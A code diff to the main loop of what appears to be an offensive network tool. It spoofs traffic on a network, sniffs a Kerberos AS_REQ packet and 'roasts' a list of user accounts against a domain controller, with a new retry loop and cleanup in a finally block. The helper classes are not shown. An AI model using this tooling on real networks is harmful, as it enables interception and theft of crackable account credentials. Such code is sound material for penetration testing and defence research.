@@ -25,7 +25,7 @@ def main(
     banner()
 
     init_logger(debug)
-    users = users_file.read().split('\n')
+    users = users_file.read().splitlines()
 
     Spoofer._enable_ip_forwarding()
 
@@ -34,26 +34,34 @@ def main(
         spoofer.start()
         
         sniffer = Sniffer(interface)
-        sniffer.run()
-        
-        while sniffer.as_req_packet == None:
-            pass
+        while True:
+            sniffer.run()
+            while sniffer.as_req_packet == None:
+                pass
 
-        roaster = Roaster(users, sniffer.as_req_packet, output_file, dc_ip)
-        roaster.roast()
+            roaster = Roaster(users, sniffer.as_req_packet, output_file, dc_ip)
+            roaster.roast()
 
-        logger.info('Preparing to shutdown, may take several seconds..')
-        
-        sniffer.stop()
-        spoofer.stop()
+            if roaster.as_req_is_valid and roaster.roasted > 0:
+                break
+            
+            if not roaster.as_req_is_valid:
+                logger.info('Captured AS_REQ is not valid, continuing to sniff...')
+            elif roaster.roasted == 0:
+                logger.info('No account was successfully roasted (wrong entries in the users file?)')
+                break
 
-        logger.info('Done!')
+            sniffer.as_req_packet = None
+
+        logger.info('Preparing to shutdown, may take several seconds...')
+
     except KeyboardInterrupt:
         logger.info('Preparing to shutdown, may take several seconds...')
-        
+
+    finally:
         sniffer.stop()
         spoofer.stop()
-        
+
         logger.info('Done!')
         
 
